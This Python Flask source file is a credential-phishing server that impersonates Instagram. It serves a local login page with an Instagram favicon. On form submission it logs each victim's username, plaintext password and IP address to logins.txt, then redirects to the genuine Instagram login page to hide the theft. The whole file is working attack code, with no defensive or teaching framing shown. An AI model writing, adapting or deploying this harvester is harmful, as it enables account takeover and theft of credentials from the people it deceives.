from flask import Flask, request, redirect, send_from_directory
import datetime

app = Flask(__name__)

# Route for saving data
@app.route('/submit', methods=['POST'])
def save_data():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr  # Local IP

    # Prepare log entry
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] IP: {ip_address} | Username: {username} | Password: {password}\n"

    # Save to logins.txt
    with open("logins.txt", "a") as file:
        file.write(log_entry)

    # Redirect to real Instagram login page
    return redirect("https://www.instagram.com/accounts/login/")

# Route for main page
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# Serve Images folder
@app.route('/Images/<path:filename>')
def serve_images(filename):
    return send_from_directory('Images', filename)

# Serve favicon
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('Images', 'INSTA-MINILOGO.png')


if __name__ == "__main__":
    app.run(debug=True)
